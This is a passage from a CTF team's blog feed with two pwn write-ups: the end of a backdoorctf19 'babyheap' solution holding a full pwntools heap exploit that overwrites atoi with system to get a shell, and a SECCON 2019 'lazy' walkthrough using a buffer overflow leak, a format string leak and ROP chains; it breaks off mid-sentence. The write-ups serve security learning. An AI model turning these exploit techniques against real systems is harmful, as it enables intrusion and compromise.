ls</span><br><span class="line">Dockerfile</span><br><span class="line">babyheap</span><br><span class="line">babyheap.c</span><br><span class="line">beast.toml</span><br><span class="line">flag.txt</span><br><span class="line">post-build.sh</span><br><span class="line">public</span><br><span class="line">setup.sh</span><br><span class="line">$ cat flag.txt</span><br><span class="line">....hiddenFlag....</span><br></pre></td></tr></table></figure><p>The full exploit:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">host, port = <span class="string">"51.158.118.84"</span>, <span class="string">"17001"</span></span><br><span class="line">filename = <span class="string">"./babyheap"</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE:</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> process(filename) <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">else</span> remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_PIE</span><span class="params">(proc)</span>:</span></span><br><span class="line">    memory_map = open(<span class="string">"/proc/&#123;&#125;/maps"</span>.format(proc.pid),<span class="string">"rb"</span>).readlines()</span><br><span class="line">    <span class="keyword">return</span> int(memory_map[<span class="number">0</span>].split(<span class="string">"-"</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(bp)</span>:</span></span><br><span class="line">    script = <span class="string">""</span></span><br><span class="line">    PIE = get_PIE(r)</span><br><span class="line">    PAPA = PIE</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> bp:</span><br><span class="line">        script += <span class="string">"b *0x%x\n"</span>%(x)</span><br><span class="line">    gdb.attach(r,gdbscript=script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index, size, data)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"\n4) Exit\n&gt;&gt; "</span>,<span class="string">'1'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"Enter the index:\n"</span>, str(index))</span><br><span class="line">r.sendlineafter(<span class="string">"Enter the size:\n"</span>, str(size))</span><br><span class="line">r.sendafter(<span class="string">"Enter data:\n"</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, data)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"\n4) Exit\n&gt;&gt; "</span>,<span class="string">'2'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"Enter the index:\n"</span>, str(index))</span><br><span class="line">r.sendafter(<span class="string">"Please update the data:\n"</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">r.sendlineafter(<span class="string">"\n4) Exit\n&gt;&gt; "</span>,<span class="string">'3'</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"Enter the index:\n"</span>, str(index))</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">global</span> r</span><br><span class="line">r = getConn()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Unsorted bin attack</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x20</span>,<span class="string">'A'</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x80</span>,<span class="string">'B'</span>*<span class="number">0x80</span>) <span class="comment"># Chunk to free</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x20</span>,<span class="string">'c'</span>*<span class="number">0x10</span>) <span class="comment">#</span></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x31</span>,<span class="string">'c'</span>*<span class="number">0x10</span>) <span class="comment"># CREATE A FAKE CHUNK HERE</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>, p64(<span class="number">0x0</span>)+p16(<span class="number">0x67f8</span><span class="number">-0x10</span>)) <span class="comment"># 4 bit brute force</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x80</span>,<span class="string">'C'</span>) <span class="comment"># if we don't get an error here and global_max_fast will be modified to a very big number</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fastbin dup</span></span><br><span class="line">free(<span class="number">0</span>) </span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">and</span> args.GDB:</span><br><span class="line">debug([<span class="number">0x400a5b</span>,<span class="number">0x400bcc</span>]) <span class="comment"># 0x400970</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0x6020f8</span>)) <span class="comment"># fake chunk</span></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x20</span>,<span class="string">'C'</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x20</span>,p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(elf.got[<span class="string">'atoi'</span>]))</span><br><span class="line">edit(<span class="number">0</span>, p64(elf.plt[<span class="string">'printf'</span>]))</span><br><span class="line"></span><br><span class="line">s = <span class="string">'%7$s    '</span></span><br><span class="line">s += p64(elf.got[<span class="string">'puts'</span>])</span><br><span class="line">r.sendlineafter(<span class="string">"\n4) Exit\n&gt;&gt; "</span>,</span><br><span class="line">s)</span><br><span class="line">PUTS = u64(r.recv(<span class="number">0x6</span>).ljust(<span class="number">0x8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">LIBC = PUTS-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">SYSTEM = LIBC+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"LIBC 0x%x"</span>%LIBC)</span><br><span class="line">log.info(<span class="string">"SYSTEM 0x%x"</span>%SYSTEM)</span><br><span class="line">r.sendlineafter(<span class="string">"\n4) Exit\n&gt;&gt; "</span>,<span class="string">"AA"</span>)</span><br><span class="line">r.sendlineafter(<span class="string">"Enter the index:\n"</span>, <span class="string">''</span>)</span><br><span class="line">r.sendafter(<span class="string">"Please update the data:\n"</span>, p64(SYSTEM)) <span class="comment"># changes atoi for system</span></span><br><span class="line">r.send(<span class="string">'/bin/sh\x00'</span>) <span class="comment"># system("/bin/sh\x00")</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">log.failure(<span class="string">"not lucky enough!"</span>)</span><br><span class="line">r.close()</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line">r.close()</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"><span class="comment">#exploit()</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> exploit():</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;Baby Heap&lt;/p&gt;
&lt;p&gt;pwn backdoorctf19&lt;/p&gt;
&lt;p&gt;Just another babyheap challenge.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://backdoor.static.beast.sdsl
      
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
      <category term="x64" scheme="https://teamrocketist.github.io/categories/Pwn/x64/"/>
    
      <category term="Glibc Malloc" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/"/>
    
      <category term="Unsorted Bin Attack" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Unsorted-Bin-Attack/"/>
    
      <category term="Fast Bin Dup" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Fast-Bin-Dup/"/>
    
    
      <category term="double_free" scheme="https://teamrocketist.github.io/tags/double-free/"/>
    
      <category term="backdoorctf2019" scheme="https://teamrocketist.github.io/tags/backdoorctf2019/"/>
    
      <category term="use_after_free" scheme="https://teamrocketist.github.io/tags/use-after-free/"/>
    
      <category term="fastbindup" scheme="https://teamrocketist.github.io/tags/fastbindup/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] SECCON 2019 - lazy</title>
    <link href="https://teamrocketist.github.io/2019/10/21/Pwn-SECCON-2019-lazy/"/>
    <id>https://teamrocketist.github.io/2019/10/21/Pwn-SECCON-2019-lazy/</id>
    <published>2019-10-21T18:43:44.000Z</published>
    <updated>2019-10-21T18:58:39.053Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>lazy</p><p>332</p><p>lazy.chal.seccon.jp 33333</p></blockquote><h3 id="1st-Stage"><a href="#1st-Stage" class="headerlink" title="1st Stage"></a>1st Stage</h3><p>No files have been provided in this challenge, let’s see what we can do it by connecting to the server:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ nc lazy.chal.seccon.jp 33333</span><br><span class="line">1: Public contents</span><br><span class="line">2: Login</span><br><span class="line">3: Exit</span><br></pre></td></tr></table></figure><p>We are presented with 3 options, login is to provide a username and password which for now we don’t know yet, public contents provides us with a bunch of files and the source code of login_source.c file:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFFER_LENGTH 32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PASSWORD <span class="meta-string">"XXXXXXXXXX"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> USERNAME <span class="meta-string">"XXXXXXXX"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">login</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> username[BUFFER_LENGTH];</span><br><span class="line"><span class="keyword">char</span> password[BUFFER_LENGTH];</span><br><span class="line"><span class="keyword">char</span> input_username[BUFFER_LENGTH];</span><br><span class="line"><span class="keyword">char</span> input_password[BUFFER_LENGTH];</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(username,<span class="number">0x0</span>,BUFFER_LENGTH);</span><br><span class="line"><span class="built_in">memset</span>(password,<span class="number">0x0</span>,BUFFER_LENGTH);</span><br><span class="line"><span class="built_in">memset</span>(input_username,<span class="number">0x0</span>,BUFFER_LENGTH);</span><br><span class="line"><span class="built_in">memset</span>(input_password,<span class="number">0x0</span>,BUFFER_LENGTH);</span><br><span class="line"></span><br><span class="line"><span class="built_in">strcpy</span>(username,USERNAME);</span><br><span class="line"><span class="built_in">strcpy</span>(password,PASSWORD);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"username : "</span>);</span><br><span class="line">input(input_username);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Welcome, %s\n"</span>,input_username);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"password : "</span>);</span><br><span class="line">input(input_password);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strncmp</span>(username,input_username,<span class="built_in">strlen</span>(USERNAME)) != <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Invalid username"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strncmp</span>(password,input_password,<span class="built_in">strlen</span>(PASSWORD)) != <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Invalid password"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">(<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> recv;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">                recv = (<span class="keyword">int</span>)read(STDIN_FILENO,&amp;buf[i],<span class="number">1</span>);</span><br><span class="line">                <span class="keyword">if</span>(recv == <span class="number">-1</span>)&#123;</span><br><span class="line">                        <span class="built_in">puts</span>(<span class="string">"ERROR!"</span>);</span><br><span class="line">                        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(buf[i] == <span class="string">'\n'</span>)&#123;</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                i++;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>There’s an obvious buffer overflow vulnerability at <strong>input</strong> function, <strong>USERNAME</strong> and <strong>PASSWORD</strong> are defined with the <strong>#define</strong> macros and later copied into local variables in the stack:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strcpy</span>(username,USERNAME);</span><br><span class="line"><span class="built_in">strcpy</span>(password,PASSWORD);</span><br></pre></td></tr></table></figure><p>Since we have no limits on the number of characters and <strong>input_username</strong> is located <strong>before</strong> in the stack we can leak both <strong>username</strong> and <strong>password</strong> if we fill until we reach that variable. </p><p>In this case we can <strong>leak</strong> the password by sending 32 characters(size of buffer), remember that to interrupt the input we need to send a newline in the end so we send <code>31* &#39;A&#39; + &#39;\n&#39;</code>.</p><p>Leaking the password:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ nc lazy.chal.seccon.jp 33333</span><br><span class="line">1: Public contents</span><br><span class="line">2: Login</span><br><span class="line">3: Exit</span><br><span class="line">2</span><br><span class="line">username : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">3XPL01717</span><br></pre></td></tr></table></figure><p>To leak the username we need to <code>&#39;A&#39;*(32+31)+&#39;\n&#39;</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">"print 'A'*(31+32)"</span></span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">$ nc lazy.chal.seccon.jp 33333</span><br><span class="line">1: Public contents</span><br><span class="line">2: Login</span><br><span class="line">3: Exit</span><br><span class="line">2</span><br><span class="line">username : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">_H4CK3R_</span><br></pre></td></tr></table></figure><p>The username is <strong><em>H4CK3R</em></strong> and the password is <strong>3XPL01717</strong>.</p><h3 id="2nd-Stage"><a href="#2nd-Stage" class="headerlink" title="2nd Stage"></a>2nd Stage</h3><p>After logging in we are presented with another option:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">nc lazy.chal.seccon.jp 33333</span><br><span class="line">1: Public contents</span><br><span class="line">2: Login</span><br><span class="line">3: Exit</span><br><span class="line">2</span><br><span class="line">username : _H4CK3R_</span><br><span class="line">Welcome, _H4CK3R_</span><br><span class="line"></span><br><span class="line">password : 3XPL01717</span><br><span class="line">Logged <span class="keyword">in</span>!</span><br><span class="line">1: Public contents</span><br><span class="line">2: Login</span><br><span class="line">3: Exit</span><br><span class="line">4: Manage</span><br><span class="line">4</span><br><span class="line">Welcome to private directory</span><br><span class="line">You can download contents <span class="keyword">in</span> this directory, but you can<span class="string">'t download contents with a dot in the name</span></span><br><span class="line"><span class="string">lazy</span></span><br><span class="line"><span class="string">libc.so.6</span></span><br><span class="line"><span class="string">Input file name</span></span><br></pre></td></tr></table></figure><p>We can now download the full executable but unfortunately we can’t download the <strong>libc.so.6</strong> which is probably a modified version, at this stage I downloaded lazy and started reverse engineering the binary:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">downloadLazy</span><span class="params">()</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'4: Manage\n'</span>,<span class="string">'4'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Input file name\n'</span>, <span class="string">'lazy'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'Sending 14216 bytes'</span>)</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'lazy'</span>, <span class="string">'w+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(r.recvall(timeout=<span class="number">2</span>))</span><br></pre></td></tr></table></figure><p>Opening it on IDA we find a format string vulnerability after inputting the file name:<br><a data-fancybox="gallery" href="https://i.imgur.com/QCcyFme.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/QCcyFme.png" alt><br></a><br>This can be combined with the buffer overflow vulnerability, we can <strong>leak</strong> addresses from the stack in this case we can leak the <strong>stack canary</strong> and a libc address from the <strong>GOT</strong> but we are missing the final piece of the puzzle we don’t know which libc version is to calculate the offsets.</p><p>Failed approaches to get the <strong>libc.so.6</strong> file:</p><ul><li><p>My first approach was to leak some libc addresses from the <strong>GOT</strong> and tried to use <a href="https://github.com/niklasb/libc-database" target="_blank" rel="noopener">libc-database</a> but I failed the <strong>libc</strong> is probably a custom one modified by the author on purpose, so my only option was to find a way to download the <strong>libc.so.6</strong> from the server.</p></li><li><p>2nd approach was to modify the file name with format string perhaps there is a check in download function which limits the amount of characters of the <strong>filename</strong> making this very hard or almost impossible (at least I didn’t manage to do it this way).</p></li></ul><p>The one that worked was to create a <strong>ropchain</strong> that would open the file and jump right at the middle of the <strong>download</strong> function at the call <strong>fstat</strong> function and why at the middle ?<br><a data-fancybox="gallery" href="https://i.imgur.com/0yKqY0B.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/0yKqY0B.png" alt><br></a><br>The first three file descriptors are reserved for stdin (0x0), stdout(0x1) and stderr(0x2), so the next open we are going to use in <strong>ROP</strong> is going to be <strong>0x3</strong> this is important to know because we don’t have a <strong>gadget</strong> that can control move values from the register <strong>rax</strong> (open returns the <strong>fd</strong> to rax) but since we know exactly the <strong>fd</strong> number is we can just use a <strong>POP RDI gadget</strong> to move the number 0x3 there.</p><p>There are two useful <strong>ROP</strong> gadgets that can be used to execute open:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary lazy | grep <span class="string">'pop rdi'</span></span><br><span class="line">0x00000000004015f3 : pop rdi ; ret</span><br><span class="line">$ ROPgadget --binary lazy | grep <span class="string">'pop rsi'</span></span><br><span class="line">0x00000000004015f1 : pop rsi ; pop r15 ; ret</span><br></pre></td></tr></table></figure><p>With this we can control both 1st and 2nd args of a function so we can construct the execution of <strong>open</strong> like this:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ropchain = p64(POPRSIR15)</span><br><span class="line">ropchain += p64(<span class="number">0x0</span>)</span><br><span class="line">ropchain += p64(LIBC_SO_6)</span><br><span class="line">ropchain += p64(POPRDI)</span><br><span class="line">ropchain += p64(LIBC_SO_6)</span><br><span class="line">ropchain += p64(elf.plt[<span class="string">'open'</span>]) <span class="comment"># open("libc.so.6", 0)</span></span><br></pre></td></tr></table></figure><p>Note that <strong>LIBC_SO_6</strong> address can be taken from the binary by using IDA like this:<br><a data-fancybox="gallery" href="https://i.imgur.com/hfAVdN4.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/hfAVdN4.png" alt><br></a><br>Another thing that we need to consider we need to set <strong>RBP</strong> into a valid address, <strong>RBP is the base frame pointer which is used to calculate with offsets to the local variables of that function , the </strong>RBP** is fucked because we are jumping right at the middle of the function:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ropchain += p64(POPRBP)</span><br><span class="line">ropchain += p64(STACKADDR+<span class="number">0x90</span>+<span class="number">0x30</span>) <span class="comment"># RBP = STACKADDR+0xc0</span></span><br></pre></td></tr></table></figure><p><strong>STACKADDR</strong> is the address we leak from the stack with format string at the position 1, but why <strong>+0xc0</strong> ?<br><a data-fancybox="gallery" href="https://i.imgur.com/Ffimar9.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/Ffimar9.png" alt><br></a><br>Another problem emerges, we also need to modify the local variable at <strong>RBP-0xdc</strong> to 0x3 otherwise <strong>read</strong> will read from a file descriptor at a value in that location in this case it will be 0x0 which is the <strong>stdin</strong><br><a data-fancybox="gallery" href="https://i.imgur.com/a8QOjjH.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/a8QOjjH.png" alt><br></a><br>But how can we modify a value at that location of the stack ? we can form a <strong>read</strong> ropchain but how do we do it if we don’t have any <strong>gadget</strong> to modify <strong>rdx</strong> ? well we can use <strong>atoi</strong> in the end of the executing it will set <strong>rdx</strong> to 0xa which is enough to use read to set the value <strong>0x3</strong> from the stdin.</p><p>Forming the ropchain:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ropchain += p64(POPRDI)</span><br><span class="line">ropchain += p64(<span class="number">0x401788</span>)</span><br><span class="line">ropchain += p64(elf.plt[<span class="string">'atoi'</span>]) <span class="comment"># atoi(0x401788) which will do RDX = 0xa</span></span><br><span class="line"></span><br><span class="line">ropchain += p64(POPRSIR15)</span><br><span class="line">ropchain += p64(STACKADDR+<span class="number">0xc0</span><span class="number">-0xdc</span>)</span><br><span class="line">ropchain += p64(<span class="number">0x3</span>)</span><br><span class="line">ropchain += p64(POPRDI)</span><br><span class="line">ropchain += p64(<span class="number">0x0</span>)</span><br><span class="line">ropchain += p64(elf.plt[<span class="string">'read'</span>]) <span class="comment"># read(0, STACKADDR+0xc0-0xdc, 0xa)</span></span><br></pre></td></tr></table></figure><p>Our python code to send this from the <strong>stdin</strong>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r.sendline(p64(<span class="number">0x03</span>)+<span class="string">'\x00'</span>)</span><br></pre></td></tr></table></figure><p>Remember this is necessary because since we are skipping running open at the <strong>download</strong> function we don’t also set <strong>RBP-0xdc</strong> to 0x3 which it should have been done here:<br><a data-fancybox="gallery" href="https://i.imgur.com/w3LkAmK.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/w3LkAmK.png" alt><br></a><br>And finally the last part which is to setup the parameters for <strong>fstat</strong> and jump to the middle of <strong>download</strong>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ropchain += p64(POPRSIR15)</span><br><span class="line">ropchain += p64(STACKADDR)</span><br><span class="line">ropchain += p64(<span class="number">0x3</span>)    </span><br><span class="line">ropchain += p64(POPRDI)</span><br><span class="line">ropchain += p64(<span class="number">0x3</span>)</span><br><span class="line">ropchain += p64(<span class="number">0x400f4c</span>) <span class="comment"># fstat(fd=0x3, STACKADDR)</span></span><br></pre></td></tr></table></figure><p>After this we can successfully download but the file is somehow corrupted it came incomplete perhaps we can still get the offsets for the functions we need to create a final ropchain and get a shell:</p><p>The offset to <strong>system</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/72xpxIV.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/72xpxIV.png" alt><br></a><br>The offset to <strong>/bin/sh</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/CDlX5wI.png" 